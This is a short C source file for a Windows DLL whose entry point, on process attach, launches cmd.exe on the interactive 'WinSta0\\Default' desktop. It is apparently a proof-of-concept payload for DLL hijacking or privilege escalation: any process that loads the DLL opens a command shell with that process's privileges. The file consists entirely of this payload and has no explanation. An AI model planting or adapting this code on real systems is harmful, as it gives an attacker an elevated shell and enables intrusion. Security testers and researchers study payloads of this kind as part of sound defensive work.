#include <windows.h>

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved )
{
	switch (ul_reason_for_call)
	{			
	case DLL_PROCESS_ATTACH:
	{	
		STARTUPINFO si;
		memset(&si,0,sizeof(si));
		si.cb=sizeof(si);
		si.lpDesktop = "WinSta0\\Default";
		PROCESS_INFORMATION pi;				
		CreateProcessA("cmd.exe",0,0,0,FALSE,0,0,0,&si,&pi);		
		break;
	}
	default:
		break;	
	}
	return TRUE;
}
